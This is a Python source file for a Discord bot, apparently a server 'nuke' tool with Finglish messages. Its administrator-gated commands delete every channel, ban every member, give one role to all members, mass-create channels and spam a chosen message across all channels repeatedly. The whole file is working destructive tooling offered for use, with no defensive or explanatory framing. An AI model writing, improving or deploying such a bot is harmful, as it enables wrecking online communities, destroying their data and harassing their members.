import discord
from discord.ext import commands
from discord.ext.commands import Bot
from discord import Permissions
from discord.utils import get
intents = discord.Intents().all()
bot = commands.Bot(command_prefix=commands.when_mentioned_or("tripyvibes!"),intents=intents)
token = ''
@bot.event 
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Trip - p - pyy"))

@bot.command()
async def tripy_nuke_del(ctx):
    guild = ctx.message.guild
    if ctx.message.author.guild_permissions.administrator:
        await ctx.message.delete()
        print("kol channel ha del shod")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except: 
                pass
        guild = ctx.message.guild
        await guild.create_text_channel('Tripy')
    else:
        await ctx.send("permission del nadari")

#banall
@bot.command()
async def tripy_ban_all(ctx):

    guild = ctx.message.guild
    if ctx.message.author.guild_permissions.administrator:
        for member in list(ctx.guild.members):
            try:
                await member.ban(reason='banall')
            except:
                pass
            await ctx.send(f"hame ro ban dadam")
    else:
        await ctx.send("permission del nadari")

#addrole to everyone
@bot.command(pass_context=True)
async def tripy_giverole(ctx, role: discord.Role):
    if ctx.message.author.guild_permissions.administrator:
        guild = ctx.message.guild
        for member in list(ctx.guild.members):
            try:
                await member.add_roles(role)
            except:
                pass
        await ctx.send(f"be hame {role} ro dadam")
    else:
        await ctx.send("permission del nadari")

#txt
@bot.command()
async def tripy_channel_create(ctx, *, name=None):
    guild = ctx.message.guild
    if ctx.message.author.guild_permissions.administrator:
        if name == None:
            await ctx.send('channel')
        else:
            x = name.split()
        if len(x)!=2:
                await ctx.send('bezn tedad ro ham')
        nam = x[0]
        num = int(x[1])
        for i in range(num):
            await guild.create_text_channel(nam)
        await ctx.send(f"{num} ta channel be esm {nam} sakhtam")
    else:
        await ctx.send("> perm nadari")



#spam ping
@bot.command()
async def tripy_nuke_spam(ctx, numb: int ,*,message ):
    guild = ctx.message.guild
    if ctx.message.author.guild_permissions.administrator:
        for i in range(numb):
            for channel in list(ctx.guild.channels):
                    try:
                        await channel.send(message)    
                    except:
                        pass
    else:
        await ctx.send("> You don't have permission to nuke.")


bot.run(token)
